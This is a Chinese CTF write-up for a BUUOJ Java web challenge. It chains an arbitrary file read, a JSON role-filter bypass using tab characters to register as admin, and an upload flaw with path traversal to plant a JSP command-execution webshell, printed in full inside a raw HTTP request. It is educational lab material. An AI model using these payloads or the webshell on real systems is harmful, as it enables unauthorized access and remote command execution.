- # 思路
	- 利用任意文件读取漏洞得到源码
	  collapsed:: true
		- `/home/download`处有任意文件读取
		- 通过 ((641ae855-b000-4991-80f0-8172ecb29684)) 可以知道web.xml以及所有类的路径，下载即可得到源码
	- 利用不正确的JSON解析方式篡改role字段，注册admin权限账户
	  collapsed:: true
		- 题目会将传入的JSON中的空格去除，然后通过正则表达式替换JSON中的role字段
			- ```java
			  // 获取上传的JSON，将空格去除，将单引号转换成双引号
			  String var = req.getParameter("data").replaceAll(" ", "").replace("'", "\"");
			  // 用regex匹配其中的role字段
			  Matcher matcher = Pattern.compile("\"role\":\"(.*?)\"").matcher(var);
			  while (matcher.find()) {
			    role = matcher.group();
			  }
			  // 变量role是其中的最后一个结果
			  if (!StringUtils.isNullOrEmpty(role)) {
			    // 替换role为guest
			    person = (Person) gson.fromJson(var.replace(role, "\"role\":\"guest\""), Person.class);
			  } else {
			    person = (Person) gson.fromJson(var, Person.class);
			    person.setRole("guest");
			  }
			  ```
		- 如果我们可以让regex匹配不到我们的role字段，就可以将role设置为admin而不被替换
		- 我们可以利用添加tab或者添加`/**/`注释的方式绕过regex
		- payload
			- ```python
			  name = "114514"
			  print(name)
			  r = base_post("http://e6fd95ff-9dee-4a42-98ce-a8c096d72e0b.node4.buuoj.cn:81/register", data = {
			      "data": '{"username":"USERNAME","password":"aaa","role":"guest","role" :"admin"}'.replace("USERNAME", name).replace(" ", "\t")
			  })
			  r = base_post("http://e6fd95ff-9dee-4a42-98ce-a8c096d72e0b.node4.buuoj.cn:81/login", data = {
			      "data": '{"username":"USERNAME","password":"aaa"}'.replace("USERNAME", name)
			  })
			  r = base_get("http://e6fd95ff-9dee-4a42-98ce-a8c096d72e0b.node4.buuoj.cn:81/home")
			  print("guest" in r.text, "admin" in r.text)
			  ```
	- 利用上传文件过滤的逻辑漏洞
		- 源码
			- ```java
			  if (checkExt(ext) || checkContent(item.getInputStream())) {
			    req.setAttribute("error", "upload failed");
			    req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
			  }
			  //                  WEB-INF/upload/{name}{ext}
			  item.write(new File(uploadPath + File.separator + name + ext));
			  req.setAttribute("error", "upload success!");
			  ```
		- 可以看到上传文件后即使文件有害也不会删除文件
		- 我们可以直接往static文件夹上传jsp webshell
		- payload参考[[CTF/JSP]]
		- payload
		  collapsed:: true
			- ```http
			  POST /home/upload HTTP/1.1
			  Host: e6fd95ff-9dee-4a42-98ce-a8c096d72e0b.node4.buuoj.cn:81
			  Content-Length: 1101
			  Cache-Control: max-age=0
			  Upgrade-Insecure-Requests: 1
			  Origin: http://e6fd95ff-9dee-4a42-98ce-a8c096d72e0b.node4.buuoj.cn:81
			  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB7pWEr2icpXgE8L5
			  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
			  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
			  Referer: http://e6fd95ff-9dee-4a42-98ce-a8c096d72e0b.node4.buuoj.cn:81/home/upload
			  Accept-Encoding: gzip, deflate
			  Accept-Language: zh-CN,zh;q=0.9
			  Cookie: JSESSIONID=893CB3940693AEEE77397D96D06F9CF4
			  Connection: close
			  
			  ------WebKitFormBoundaryB7pWEr2icpXgE8L5
			  Content-Disposition: form-data; name="file"; filename="../../static/b.jsp"
			  Content-Type: application/octet-stream
			  
			  <%@ page import="java.io.*" %>
			  <%
			  String cmd = request.getParameter("cmd");
			  String output = "";
			  if(cmd != null) {
			      String s = null;
			      try {
			          Process p = Runtime.getRuntime().exec(cmd);
			          BufferedReader stdInput = new BufferedReader(new 
			  InputStreamReader(p.getInputStream()));
			          BufferedReader stdError = new BufferedReader(new 
			  InputStreamReader(p.getErrorStream()));
			          while ((s = stdInput.readLine()) != null) {
			              output += s+"\n";
			          }
			          while ((s = stdError.readLine()) != null) {
			              output += s+"\n";
			          }
			      }
			      catch (IOException e) {
			          e.printStackTrace();
			      }
			  }
			  %>
			  <html>
			  <head>
			  <title>JSP Webshell</title>
			  </head>
			  <body>
			  <form method="GET" action="<%=request.getRequestURI()%>">
			  <input type="text" name="cmd" size="80">
			  <input type="submit" value="Execute">
			  </form>
			  <pre>
			  <%=output %>
			  </pre>
			  </body>
			  </html>
			  
			  ------WebKitFormBoundaryB7pWEr2icpXgE8L5--
			  
			  ```
	-